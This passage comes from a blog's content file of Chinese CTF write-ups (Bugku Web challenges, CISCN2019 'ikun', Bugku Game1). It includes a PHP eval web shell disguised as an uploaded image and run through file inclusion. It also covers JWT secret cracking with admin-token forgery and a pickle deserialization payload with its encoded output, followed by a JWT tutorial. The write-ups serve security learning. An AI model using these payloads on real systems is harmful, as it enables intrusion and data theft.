class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>],<span class="string">&#x27;image&#x27;</span>)!== <span class="literal">False</span>) &amp;&amp; ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">		$file_ext =  substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext);</span><br><span class="line">        $allowexts = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$allowexts))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;give me a image file not a php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bugku&quot;</span>.date(<span class="string">&#x27;dHis&#x27;</span>).<span class="string">&quot;_&quot;</span>.rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	    	<span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span>&#123;</span><br><span class="line">	    	<span class="keyword">if</span> (!file_exists(<span class="string">&#x27;./upload/&#x27;</span>))&#123;</span><br><span class="line">	    		mkdir (<span class="string">&quot;./upload/&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;chmod 777 /var/www/html/upload&quot;</span>);</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Upload Success&lt;br&gt;&quot;</span>;</span><br><span class="line">                $filepath = <span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">	      	<span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> .<span class="string">&quot;&lt;a href=&#x27;&quot;</span> . $filepath . <span class="string">&quot;&#x27; target=&#x27;_blank&#x27;&gt;&quot;</span> . $filepath . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;You was catched! :) &lt;br /&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/28/EnRi5YvATQrpLIZ.png" alt="3.png"><br><img src="https://i.loli.net/2021/04/28/l7rkO9WLfUYSFKh.png" alt="2.png"><br><img src="https://i.loli.net/2021/04/28/Kn3RW8AiZaEypkL.png" alt="1.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web33</title>
+    <url>/2021/04/28/Bugku-Web33/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web33"><a href="#Bugku-Web33" class="headerlink" title="Bugku Web33"></a>Bugku Web33</h1><blockquote>
+<p>描述：fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</p>
+</blockquote>
+<p>下载文件，是一段php代码，提示给的字符串应该就是flag加密后得到的字符串，现在需要对其解密，得到flag，代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$data,$key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">&#x27;ISCC&#x27;</span>); <span class="comment">#729623334f0aa2784a1599fd374c120d</span></span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">    $mkey = <span class="string">&quot;729623334f0aa2784a1599fd374c120d&quot;</span>;</span><br><span class="line">    $klen = strlen($mkey);</span><br><span class="line">    $tmp = $str;</span><br><span class="line">    $tmp = base64_decode($tmp);  <span class="comment">// 对 base64 后的字符串 decode</span></span><br><span class="line">    $md_len = strlen($tmp); <span class="comment">//获取字符串长度</span></span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $char = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i &lt; $md_len;$i++) &#123;  <span class="comment">//  取二次加密用 key;</span></span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)  <span class="comment">// 数据长度是否超过 key 长度检测</span></span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        $char .= $mkey[$x];  <span class="comment">// 从 key 中取二次加密用 key</span></span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $md_data = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$md_len;$i++) &#123; <span class="comment">// 取偏移后密文数据</span></span><br><span class="line">        array_push($md_data, ord($tmp[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    $md_data_source = <span class="keyword">array</span>();</span><br><span class="line">    $data1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $data2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($md_data <span class="keyword">as</span> $key =&gt; $value) &#123; <span class="comment">// 对偏移后的密文数据进行还原</span></span><br><span class="line">        $i = $key;</span><br><span class="line">        <span class="keyword">if</span>($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125;</span><br><span class="line">        $dd = $value;</span><br><span class="line">        $od = ord($mkey[$i]);</span><br><span class="line">        array_push($md_data_source,$dd);</span><br><span class="line">        $data1 .= chr(($dd+<span class="number">128</span>)-$od);  <span class="comment">// 第一种可能, 余数+128-key 为回归数</span></span><br><span class="line">        $data2 .= chr($dd-$od);  <span class="comment">// 第二种可能, 余数直接-key 为回归数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data1 =&gt; &quot;</span>.$data1.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data2 =&gt; &quot;</span>.$data2.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str = <span class="string">&quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&quot;</span>;</span><br><span class="line">decrypt($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Web34</title>
+    <url>/2021/04/28/Bugku-Web34/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web34"><a href="#Bugku-Web34" class="headerlink" title="Bugku Web34"></a>Bugku Web34</h1><blockquote>
+<p>提示：文件包含</p>
+</blockquote>
+<p>&emsp;&emsp;进入环境，页面也没有什么特殊的地方，注意到URL中有filename，可能存在文件包含漏洞<br><img src="https://i.loli.net/2021/04/28/Z7GXlykMqLQ31d9.png" alt="3.png"></p>
+<p>&emsp;&emsp;查看源代码，发现了upload.php，访问upload.php<br><img src="https://i.loli.net/2021/04/28/bEvD3iSZYg9epwF.png" alt="4.png"></p>
+<p>&emsp;&emsp;发现了上传功能，尝试通过burpsuite修改上传马儿，发现只允许上传图片格式，不过存在文件包含漏洞，我们依然能够有办法让马儿跑，此时只需要让filename等于我们上传的图片被保存的名字也可以执行里面的马儿。写入一句话木马的时候发现直接写`<?php @eval($_POST['pass']); ?>，<?php ?>会被删除，换一种方式用script绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/28/mdWGCDFBHr3wTM1.png" alt="6.png"></p>
+<p>&emsp;&emsp;蚁剑直接连接<code>http://114.67.246.176:12372/index.php?file=upload/202104280813155137.jpg</code>,然后打开虚拟终端，在根目录cat flag就可以获得flag</p>
+<p><img src="https://i.loli.net/2021/04/28/shUgKbRLznikQt8.png" alt="5.png"></p>
+<p><img src="https://i.loli.net/2021/04/28/QpJSMKsn28O7GEP.png" alt="2.png"></p>
+<p><img src="https://i.loli.net/2021/04/28/k62vimMqDUrhGzB.png" alt="1.png"></p>
+]]></content>
+      <tags>
+        <tag>Bugku Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>iKun</title>
+    <url>/2021/05/08/ikun/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><blockquote>
+<p>只因你太美</p>
+</blockquote>
+<h2 id="先瞅瞅"><a href="#先瞅瞅" class="headerlink" title="先瞅瞅"></a>先瞅瞅</h2><p>打开环境，开幕雷击，鸡你太美！<br><img src="https://i.loli.net/2021/05/08/9DWou4F5XmjpLKZ.png" alt="1.png"></p>
+<h2 id="再试试"><a href="#再试试" class="headerlink" title="再试试"></a>再试试</h2><p>先注册登录，盲猜会用到admin账号，尝试注册admin+空格 ,失败了，只能随便注册一下，登陆后看到左下角的一定要抢到lv6，往下滑，发现每个商品都会有一lv的标签，发现lv标签与商品图片是两个图片，也就是说可以编写脚本查找lv6.png<br><img src="https://i.loli.net/2021/05/08/Sw2uRiLjQW4UpbB.png" alt="2.png"></p>
+<p>脚本如下,得到结果为181，因此lv6在第181页，进入到第181页，找到对应商品购买，发现钱不够</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://6ec470a9-5d1d-4d73-894c-1364a0178d28.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500</span>):</span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/05/08/cUdGtBvIMKqFWhL.png" alt="3.png"></p>
+<p>看到了莫名其妙的优惠券，可能有文章，点击购买，用burp抓包，果然看到了折扣，偷偷修改为很小的数。弹出来的网页显示只能是admin才能访问，果然。<br><img src="https://i.loli.net/2021/05/08/bCxrczHuT1dogSE.png" alt="1.png"><br><img src="https://i.loli.net/2021/05/08/sRyor7zqmU8ObKc.png" alt="2.png"></p>
+<p>再观察抓到的包，使用了JWT，用jwt.io解码看看，看到了我们的用户名a，然后可以使用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>进行爆破<br><img src="https://i.loli.net/2021/05/08/71Wo9JkOIspElBg.png" alt="1.png"></p>
+<p>使用c-jwt-cracker的时候，先从GitHub下载代码，之后如果没有下载过openssl则先执行<code>sudo apt-get install libssl-dev</code>下载，之后在文件目录中执行<code>make</code>,用生成的可执行文件来进行爆破，可以得到secret为1Kun<br><img src="https://i.loli.net/2021/05/08/DvioVJIRMGfnyTQ.png" alt="2.png"></p>
+<p>之后用jwt.io生成我们需要的jwt，将username设置为admin<br><img src="https://i.loli.net/2021/05/08/OY8CjLv1xNVWdTw.png" alt="3.png"></p>
+<p>替换掉原来的jwt，就可以解锁新界面，除了利用burp，还可以直接打开浏览器的控制台，直接修改也可以<br><img src="https://i.loli.net/2021/05/08/Oiph9m8CE7WqMgA.png" alt="1.png"><br>查看网页源代码，发现了一个链接，点击下载网站的源代码，开始分析<br><img src="https://i.loli.net/2021/05/08/RgslpFaHuIO4J8G.png" alt="2.png"><br>在sshop/views/Admin.py中找到了一个反序列化点</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造payload获得flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>
+<p>运行的结果为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
+<p>将become的内容改为上面得到的序列，然后获得flag<br><img src="https://i.loli.net/2021/05/08/V2FKLk69Z78nuhI.png" alt="3.png"><br>或者直接在浏览器控制台修改也能得到flag，首先将become的hiden属性删除，就会发现出现一个输入框，输入刚才得到的序列得到flag<br><img src="https://i.loli.net/2021/05/08/o47cgzqipPJdBZU.png" alt="2.png"><br><img src="https://i.loli.net/2021/05/08/hmldG8Pn7zKW1c2.png" alt="3.png"><br><img src="https://i.loli.net/2021/05/08/dI9FLKf7MR1zcau.png" alt="4.png"></p>
+<h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p> Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
+<p>说起JWT，我们应该来谈一谈基于token的认证和传统的session认证的区别。</p>
+<p>我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。</p>
+<p>但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来.</p>
+<p><strong>Session</strong>: 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</p>
+<p><strong>扩展性</strong>: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</p>
+<p><strong>CSRF</strong>: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p>
+<h2 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h2><p>基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p>
+<p>流程上是这样的：</p>
+<ul>
+<li>用户使用用户名密码来请求服务器</li>
+<li>服务器进行验证用户的信息</li>
+<li>服务器通过验证发送给用户一个token</li>
+<li>客户端存储token，并在每次请求时附送上这个token值</li>
+<li>服务端验证token值，并返回数据</li>
+</ul>
+<p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持 <code>CORS(&amp;#x8DE8;&amp;#x6765;&amp;#x6E90;&amp;#x8D44;&amp;#x6E90;&amp;#x5171;&amp;#x4EAB;)</code>策略，一般我们在服务端这么做就可以了 <code>Access-Control-Allow-Origin: *</code>。</p>
+<p>那么我们现在回到JWT的主题上。</p>
+<h3 id="JWT长什么样？"><a href="#JWT长什么样？" class="headerlink" title="JWT长什么样？"></a>JWT长什么样？</h3><p>JWT是由三段信息构成的，将这三段信息文本用 <code>.</code>链接一起就构成了Jwt字符串。就像这样:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
+
+<h3 id="JWT的构成"><a href="#JWT的构成" class="headerlink" title="JWT的构成"></a>JWT的构成</h3><p>第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).</p>
+<p>jwt的头部承载两部分信息：</p>
+<ul>
+<li>声明类型，这里是jwt</li>
+<li>声明加密的算法 通常直接使用 HMAC SHA256</li>
+</ul>
+<p>完整的头部就像下面这样的JSON：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#39;typ&#39;: &#39;JWT&#39;,</span><br><span class="line">  &#39;alg&#39;: &#39;HS256&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>
+
+<p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p>
+<ul>
+<li>标准中注册的声明</li>
+<li>公共的声明</li>
+<li>私有的声明</li>
+</ul>
+<p><strong>标准中注册的声明</strong> (建议但不强制使用) ：</p>
+<ul>
+<li><p><strong>iss</strong>: jwt签发者</p>
+</li>
+<li><p><strong>sub</strong>: jwt所面向的用户</p>
+</li>
+<li><p><strong>aud</strong>: 接收jwt的一方</p>
+</li>
+<li><p><strong>exp</strong>: jwt的过期时间，这个过期时间必须要大于签发时间</p>
+</li>
+<li><p><strong>nbf</strong>: 定义在什么时间之前，该jwt都是不可用的.</p>
+</li>
+<li><p><strong>iat</strong>: jwt的签发时间</p>
+</li>
+<li><p><strong>jti</strong>: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</p>
+</li>
+</ul>
+<p><strong>公共的声明</strong> ：<br>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.</p>
+<p><strong>私有的声明</strong> ：<br>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p>
+<p>定义一个payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后将其进行base64加密，得到Jwt的第二部分。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>
+
+<p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p>
+<ul>
+<li>header (base64后的)</li>
+<li>payload (base64后的)</li>
+<li>secret</li>
+</ul>
+<p>这个部分需要base64加密后的header和base64加密后的payload使用 <code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐 <code>secret</code>组合加密，然后就构成了jwt的第三部分。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; javascript</span><br><span class="line">var encodedString &#x3D; base64UrlEncode(header) + &#39;.&#39; + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line">var signature &#x3D; HMACSHA256(encodedString, &#39;secret&#39;); &#x2F;&#x2F; TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
+
+<p>将这三部分用 <code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</strong></p>
+<p>一般是在请求头里加入 <code>Authorization</code>，并加上 <code>Bearer</code>标注：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch(&#39;api&#x2F;user&#x2F;1&#39;, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#39;Authorization&#39;: &#39;Bearer &#39; + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>服务端会验证token，如果验证通过就会返回相应的资源。整个流程就是这样的:</p>
+<ul>
+<li><p>因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。</p>
+</li>
+<li><p>因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。</p>
+</li>
+<li><p>便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。</p>
+</li>
+<li><p>它不需要在服务端保存会话信息, 所以它易于应用的扩展</p>
+</li>
+<li><p>不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。</p>
+</li>
+<li><p>保护好secret私钥，该私钥非常重要。</p>
+</li>
+<li><p>如果可以，请使用https协议</p>
+</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>2019Ciscn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku Game1</title>
+    <url>/2021/05/11/Bugku-Game1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Game1"><a href="#Bugku-Game1" class="headerlink" title="Bugku Game1"></a>Bugku Game1</h1><h2 id="先瞅瞅"><a href="#先瞅瞅" class="headerlink" title="先瞅瞅"></a>先瞅瞅</h2><p>打开环境，进去是一个游戏，先玩一下，是个盖楼游戏</p>
+<p><img src="https://i.loli.net/2021/05/11/9ZFMYQcfzmRltqd.png" alt="2.png"></p>
+<p>然后查看源代码，发现下面这几句话，有一个score.php,是用来提交分数的，看到这里就不难猜到应该是分数过了某个分数就会拿到flag，这里面有三个参数，看起来分别是分数、ip以及分数的base64编码，这里随便试一下，分数先搞一个6666，然后ip就是源码里的，sign就是编码NjY2Ngo=，构造输入<code>http://114.67.246.176:19820/score.php?score=6666&amp;ip=111.33.78.4.54&amp;sign=NjY2Ngo=</code>，发现返回失败了</p>
